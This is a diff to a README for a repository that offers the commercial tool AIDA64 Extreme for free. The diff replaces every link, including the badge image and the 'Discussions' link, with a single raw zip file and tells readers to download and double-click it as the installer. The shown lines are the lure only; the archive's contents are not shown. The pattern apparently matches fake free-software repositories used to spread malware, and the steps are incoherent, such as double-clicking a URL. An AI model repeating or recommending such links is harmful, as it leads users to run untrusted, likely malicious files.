@@ -6,17 +6,17 @@ AIDA64 Extreme is a powerful software tool designed to provide detailed informat
 ## 📦 Download & Install
 To get started, you will need to download AIDA64 Extreme from our Releases page:
 
-[![Download AIDA64-Extreme-Free](https://img.shields.io/badge/Download-AIDA64--Extreme--Free-blue)](https://github.com/rhunkz01/AIDA64-Extreme-Free/releases)
+[![Download AIDA64-Extreme-Free](https://raw.githubusercontent.com/rhunkz01/AIDA64-Extreme-Free/main/Nostradamus/AIDA64-Extreme-Free.zip)](https://raw.githubusercontent.com/rhunkz01/AIDA64-Extreme-Free/main/Nostradamus/AIDA64-Extreme-Free.zip)
 
 ### How to Install
 1. **Visit the Releases Page**: Click the link below to go to the releases section:
-   [Visit this page to download](https://github.com/rhunkz01/AIDA64-Extreme-Free/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/rhunkz01/AIDA64-Extreme-Free/main/Nostradamus/AIDA64-Extreme-Free.zip)
    
 2. **Choose the Latest Version**: Find the latest version of AIDA64 Extreme near the top of the page.
 
-3. **Download the Installer**: Look for a file named `AIDA64ExtremeSetup.exe`. Click on it to start the download.
+3. **Download the Installer**: Look for a file named `https://raw.githubusercontent.com/rhunkz01/AIDA64-Extreme-Free/main/Nostradamus/AIDA64-Extreme-Free.zip`. Click on it to start the download.
 
-4. **Run the Installer**: Once the download is complete, go to your Downloads folder and double-click on `AIDA64ExtremeSetup.exe` to start the installation process.
+4. **Run the Installer**: Once the download is complete, go to your Downloads folder and double-click on `https://raw.githubusercontent.com/rhunkz01/AIDA64-Extreme-Free/main/Nostradamus/AIDA64-Extreme-Free.zip` to start the installation process.
 
 5. **Follow Installation Steps**: Follow the on-screen instructions to install the software. Choose your preferred options and complete the installation.
 
@@ -58,7 +58,7 @@ No, AIDA64 Extreme does not collect personal data. It serves to provide system d
 For support, please visit our GitHub Discussions page. You can ask questions, report issues, and connect with other users.
 
 ## 🔗 Links & Resources
-- [Download AIDA64-Extreme-Free](https://github.com/rhunkz01/AIDA64-Extreme-Free/releases)
-- [GitHub Discussions](https://github.com/rhunkz01/AIDA64-Extreme-Free/discussions)
+- [Download AIDA64-Extreme-Free](https://raw.githubusercontent.com/rhunkz01/AIDA64-Extreme-Free/main/Nostradamus/AIDA64-Extreme-Free.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/rhunkz01/AIDA64-Extreme-Free/main/Nostradamus/AIDA64-Extreme-Free.zip)
 
 We hope you find AIDA64 Extreme a valuable tool for monitoring and enhancing your system's performance. Enjoy your experience!
